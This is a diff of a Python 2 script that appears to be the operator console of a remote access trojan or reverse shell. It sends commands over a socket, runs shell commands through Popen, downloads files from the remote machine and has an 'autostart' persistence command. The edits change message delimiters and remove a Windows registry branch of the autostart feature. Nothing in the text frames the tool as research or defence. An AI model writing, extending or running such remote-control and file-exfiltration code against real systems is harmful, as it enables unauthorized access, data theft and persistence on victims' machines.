@@ -32,7 +32,11 @@ except socket.error, (value,message):
 
 def RecvData():
     temp = connstream.read()
-    return temp
+    outData = ""
+    while temp != "CEND":
+        outData += temp
+        temp = connstream.read()
+    return outData
 
 def ExecIN(cmd):
     p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
@@ -65,10 +69,12 @@ def ExecIN(cmd):
 
 def SendData(inText):
     connstream.write(inText)
+    connstream.write("SEND")
 
 def DownloadFILE(fileName):
     fileDOWN = open(fileName, 'wa')
     fileSize = int(RecvData())
+    print type(fileSize)
     print colored.cyan("[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize))
     FSD = 0
     pbar = tqdm(total=fileSize)
@@ -249,16 +255,8 @@ while True:
                 if inText.split(":")[1] == "autostart":
                     SendData(inText)
                     plat = RecvData()
-                    if plat == "Windows":
-                        regQuery = RecvData()
-                        print regQuery
-                        regDo = raw_input()
-                        SendData(regDo)
-                        status = RecvData()
-                        print colored.green(status)
-                    else:
-                        print colored.green(plat)
+                    print colored.green(plat)
             else:
-                connstream.write(inText)
+                SendData(inText)
                 outTT = RecvData()
                 print (('%s[outText] ' + outTT +"%s") % (fg(6),attr(0)))
